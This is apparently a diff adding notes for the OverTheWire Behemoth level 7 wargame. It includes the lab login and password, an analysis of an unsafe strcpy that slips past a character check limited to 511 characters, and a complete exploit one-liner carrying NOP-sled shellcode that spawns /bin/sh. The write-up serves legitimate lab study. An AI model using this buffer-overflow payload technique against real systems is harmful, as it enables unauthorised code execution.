@@ -1,2 +1,36 @@
 ssh -p 2221 behemoth7@behemoth.labs.overthewire.org
 pass: baquoxuafo
+
+
+
+
+'''
+Diving into the binary,
+I immediately started looking for the vulnerability.
+I noticed the `fprintf`, and thought perhaps there's a format string vulnerability,
+but I notice that it wasn't it and that the string was formatted safely.
+
+Searching for another interesting functions,
+I noticed there's an unsafe `strcpy`,
+instantly noticed that shellcode could be inject from argv[1].
+
+There's a catch though,
+before the function is called, the program validates the input string (argv[1]) for "non-alpha" characters,
+if it founds any, it prints ""Non-%s chars found in string, possible shellcode!"
+
+We'd have to find a way to overcome this validation.
+Let's take a look at how the program does the following validation.
+
+If we'd peek at `.text:08048622`, we'll be able to see that the code
+iterates over the characters in argv[1] until it reaches the 511 character where it stops the validations and simply copies the input into another local buffer.
+'''
+
+
+# Exploit Development
+b *0x08048640
+/behemoth/behemoth7 $(python -c "print ('A' * 528) + '\x74\xd4\xff\xff' + ('\x90' * 100) + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
+
+
+('A' * 528) # This is needed to overflow the validation, which only checks the first 511 characters, and we add some extra buffer to overwrite the return address.
+# Then we add an actual payload and redirect the flow execution to it.
+# The payload is simply a NOP sled and a exec(/bin/sh) shellcode.
